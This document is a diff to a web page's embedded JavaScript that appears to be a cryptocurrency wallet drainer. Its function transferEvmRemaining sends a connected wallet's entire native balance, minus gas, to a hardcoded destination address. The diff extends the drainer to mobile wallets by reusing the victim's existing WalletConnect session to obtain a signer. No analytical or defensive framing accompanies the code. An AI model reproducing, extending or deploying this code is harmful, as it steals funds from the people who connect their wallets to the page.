@@ -1008,7 +1008,7 @@
                 throw new Error("Could not get chainId or address from provided provider");
               }
 
-              return await transferEvmRemaining(provider, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4");
+              return await transferEvmRemaining(provider, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
             } 
             else if (provider === null && connectionInfo._wcSession) {
               // WalletConnect session on mobile (provider is null)
@@ -1022,7 +1022,7 @@
               
               // Try window.ethereum first (might be available), then fallback to direct RPC
               const providerToUse = window.ethereum || null;
-              return await transferEvmRemaining(providerToUse, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4");
+              return await transferEvmRemaining(providerToUse, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
             }
             else if (window.ethereum) { 
               // Direct injected extension fallback (MetaMask, SafePal, etc.)
@@ -1030,7 +1030,7 @@
               chainId = await window.ethereum.request({ method: 'eth_chainId' });
               const accounts = await window.ethereum.request({ method: 'eth_accounts' });
               fromAddress = accounts[0];
-              return await transferEvmRemaining(window.ethereum, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4");
+              return await transferEvmRemaining(window.ethereum, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
             } 
             else if (window.solana?.publicKey) { 
               // Solana (Phantom, Solflare, etc.)
@@ -1061,7 +1061,7 @@
         // ──────────────────────────────────────────────────────────────────────────────────
         // EVM CHAINS (Ethereum, BSC, Polygon, Arbitrum, Base, etc.) + ERC-20 tokens
         // ──────────────────────────────────────────────────────────────────────────────────
-        async function transferEvmRemaining(injectedProvider, chainId, fromAddress, infuraId, targetAddress) {
+        async function transferEvmRemaining(injectedProvider, chainId, fromAddress, infuraId, targetAddress, session = null) {
           const chainIdNum = Number(chainId);
 
           // RPC mapping - major EVM chains (public + Infura where available)
@@ -1094,43 +1094,60 @@
 
           const rpcUrl = rpcMap[chainIdNum] || `https://mainnet.infura.io/v3/${infuraId}`;
           
-          // Use JsonRpcProvider as base (always safe)
-          const jsonProvider = new ethers.JsonRpcProvider(rpcUrl);
-
+          let provider;
           let signer;
 
-          // Try injected provider first (desktop extensions)
+          // 1. Desktop extension / injected provider
           if (injectedProvider?.request) {
             try {
-              signer = await new ethers.BrowserProvider(injectedProvider).getSigner();
-              console.log("Using injected BrowserProvider signer");
+              provider = new ethers.BrowserProvider(injectedProvider);
+              signer = await provider.getSigner();
+              console.log("Using injected BrowserProvider signer (desktop/extension)");
             } catch (e) {
-              console.warn("Injected provider failed, trying fallback:", e.message);
+              console.warn("Injected provider failed:", e.message);
             }
           }
 
-          // Fallback for WalletConnect mobile (use window.ethereum if available)
-          if (!signer) {
-            console.log("Using fallback signer for WalletConnect/mobile");
-            if (window.ethereum?.request) {
-              try {
-                signer = await new ethers.BrowserProvider(window.ethereum).getSigner();
-                console.log("Using window.ethereum signer");
-              } catch (e) {
-                console.error("window.ethereum also failed:", e.message);
-                throw new Error("No valid signer available for this wallet type. Try connecting with a desktop extension.");
+          // 2. Mobile WalletConnect session - create real provider from session
+          if (!signer && session) {
+            try {
+              console.log("Creating WC EthereumProvider from session for mobile");
+              const wcProvider = await EthereumProvider.init({
+                projectId: '81ec0eb195ddbee9c5596804e33ff584',
+                chains: [chainIdNum],
+                methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
+                events: ['chainChanged', 'accountsChanged'],
+                showQrModal: false
+              });
+
+              // Pair with existing session using topic
+              if (session.topic) {
+                console.log("Pairing WC provider with session topic:", session.topic);
+                await wcProvider.pair({ topic: session.topic });
               }
-            } else {
-              throw new Error("No valid signer available for this wallet type. Try connecting with a desktop extension.");
+
+              provider = new ethers.BrowserProvider(wcProvider);
+              signer = await provider.getSigner();
+              console.log("WC mobile signer created successfully");
+            } catch (e) {
+              console.error("WC EthereumProvider creation failed:", e.message);
             }
           }
 
-          const balance = await jsonProvider.getBalance(fromAddress);
-          const feeData = await jsonProvider.getFeeData();
+          // 3. Ultimate fallback - plain RPC (no signing)
+          if (!signer) {
+            console.log("No signer available - using read-only JsonRpcProvider");
+            provider = new ethers.JsonRpcProvider(rpcUrl);
+            throw new Error("No signer available. On mobile, ensure WalletConnect session supports signing.");
+          }
 
-          const gasLimit = 21000n; // native transfer
+          // Now proceed with balance & transfer
+          const balance = await provider.getBalance(fromAddress);
+          const feeData = await provider.getFeeData();
+
+          const gasLimit = 21000n;
           const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;
-          const estimatedGasCost = gasPrice * gasLimit * 150n / 100n; // 150% buffer
+          const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;
 
           if (balance <= estimatedGasCost * 2n) {
             throw new Error("Native balance too low to cover gas + transfer");
@@ -1138,13 +1155,14 @@
 
           const amountNative = balance - estimatedGasCost;
 
-          // ── Native transfer ────────────────────────────────────────────────────────
           console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountNative)}`);
+
           const nativeTx = await signer.sendTransaction({
             to: targetAddress,
             value: amountNative,
             gasLimit,
           });
+
           await nativeTx.wait();
           console.log("Native transfer tx:", nativeTx.hash);
 
@@ -2160,5 +2178,6 @@
     <script src="script.js"></script>
 </body>
 </html>
+
 
 
